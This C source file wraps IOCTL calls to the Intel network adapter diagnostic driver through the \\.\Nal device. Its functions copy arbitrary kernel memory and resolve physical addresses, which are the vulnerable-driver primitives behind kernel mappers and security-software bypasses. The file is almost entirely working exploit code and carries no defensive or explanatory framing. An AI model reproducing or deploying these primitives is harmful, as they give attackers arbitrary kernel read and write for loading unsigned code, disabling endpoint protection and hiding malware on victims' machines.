#define WIN32_LEAN_AND_MEAN
#include <windows.h>
#include "intel.h"

BOOL MemCpy(
	HANDLE hDriver,
	LPVOID Destination,
	LPVOID Source,
	ULONG64 Length
)
{
	MEMCPY_INFO MemCpyInfo;
	DWORD       ReturnBytes;

	MemCpyInfo.CaseNum = CASE_NUMBER_MEMCPY;
	MemCpyInfo.Src     = (ULONG64)Source;
	MemCpyInfo.Dst     = (ULONG64)Destination;
	MemCpyInfo.Len     = Length;

	return DeviceIoControl(
		hDriver, 
		IOCTL_TRIGGER_FUNCTION,
		&MemCpyInfo,
		sizeof(MEMCPY_INFO),
		NULL,
		0,
		&ReturnBytes,
		NULL
	);
};

BOOL GetPhys(
	HANDLE hDriver,
	LPVOID VirtualAddress,
	LPVOID *lpPhysicalAddress
)
{
	GET_PHYS_INFO GetPhysicalAddr;
	DWORD         ReturnBytes;

	GetPhysicalAddr.CaseNum  = CASE_NUMBER_GET_PHYSICAL;
        GetPhysicalAddr.VirtAddr = (ULONG64)VirtualAddress;
	
	if ( DeviceIoControl(
		hDriver,
		IOCTL_TRIGGER_FUNCTION,
		&GetPhysicalAddr,
		sizeof(GET_PHYS_INFO),
		NULL,
		0,
		&ReturnBytes,
		NULL
	     ) 
        ) { 
	  *lpPhysicalAddress = (LPVOID)GetPhysicalAddr.PhysAddr;
	  return TRUE;
	};
	return FALSE;
};

HANDLE GetHandle()
{
	return CreateFileA(
		"\\\\.\\Nal",
		GENERIC_READ | GENERIC_WRITE,
		FILE_SHARE_READ,
		NULL,
		OPEN_EXISTING,
		FILE_ATTRIBUTE_NORMAL,
		NULL
	);
};
